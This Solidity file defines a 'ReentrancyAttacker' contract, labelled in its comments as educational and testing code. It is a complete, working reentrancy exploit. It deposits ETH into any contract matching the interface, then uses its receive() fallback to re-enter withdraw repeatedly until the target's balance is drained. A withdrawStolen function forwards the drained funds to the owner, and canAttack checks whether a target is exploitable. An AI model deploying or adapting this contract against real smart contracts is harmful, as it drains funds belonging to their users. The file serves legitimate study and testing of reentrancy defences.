// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getBalance(address user) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @dev Contract that demonstrates reentrancy attack patterns for testing
 * WARNING: This is for educational and testing purposes only
 */
contract ReentrancyAttacker {
    IVulnerableContract public target;
    address public owner;
    uint256 public attackAmount;
    uint256 public maxRecursion;
    uint256 public currentRecursion;
    bool public attacking;
    
    event AttackStarted(address target, uint256 amount);
    event AttackCompleted(uint256 stolenAmount);
    event RecursiveCall(uint256 recursionLevel);
    
    constructor(address targetContract) {
        target = IVulnerableContract(targetContract);
        owner = msg.sender;
        maxRecursion = 10; // Prevent infinite recursion
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    /**
     * @dev Initialize the attack by depositing funds
     */
    function setupAttack() external payable onlyOwner {
        require(msg.value > 0, "Must send ETH");
        attackAmount = msg.value;
        
        // Deposit to the vulnerable contract
        target.deposit{value: msg.value}();
    }
    
    /**
     * @dev Execute the reentrancy attack
     */
    function attack() external onlyOwner {
        require(!attacking, "Attack in progress");
        require(attackAmount > 0, "Setup attack first");
        
        attacking = true;
        currentRecursion = 0;
        
        emit AttackStarted(address(target), attackAmount);
        
        // Start the attack by withdrawing our deposit
        target.withdraw(attackAmount);
    }
    
    /**
     * @dev Fallback function that performs the reentrancy
     */
    receive() external payable {
        if (attacking && currentRecursion < maxRecursion) {
            currentRecursion++;
            emit RecursiveCall(currentRecursion);
            
            // Check if target still has balance
            uint256 targetBalance = address(target).balance;
            if (targetBalance >= attackAmount) {
                // Continue the attack
                target.withdraw(attackAmount);
            } else if (targetBalance > 0) {
                // Withdraw remaining balance
                target.withdraw(targetBalance);
            } else {
                // Attack completed
                attacking = false;
                emit AttackCompleted(address(this).balance);
            }
        }
    }
    
    /**
     * @dev Withdraw stolen funds
     */
    function withdrawStolen() external onlyOwner {
        require(!attacking, "Attack in progress");
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds to withdraw");
        
        payable(owner).transfer(balance);
    }
    
    /**
     * @dev Set maximum recursion depth
     */
    function setMaxRecursion(uint256 _maxRecursion) external onlyOwner {
        maxRecursion = _maxRecursion;
    }
    
    /**
     * @dev Emergency stop
     */
    function emergencyStop() external onlyOwner {
        attacking = false;
    }
    
    /**
     * @dev Get attack status
     */
    function getAttackStatus() external view returns (
        bool isAttacking,
        uint256 recursionLevel,
        uint256 contractBalance,
        uint256 targetBalance
    ) {
        return (
            attacking,
            currentRecursion,
            address(this).balance,
            address(target).balance
        );
    }
    
    /**
     * @dev Check if attack is possible
     */
    function canAttack() external view returns (bool) {
        uint256 ourBalance = target.getBalance(address(this));
        uint256 targetBalance = address(target).balance;
        return ourBalance > 0 && targetBalance >= ourBalance && !attacking;
    }
} 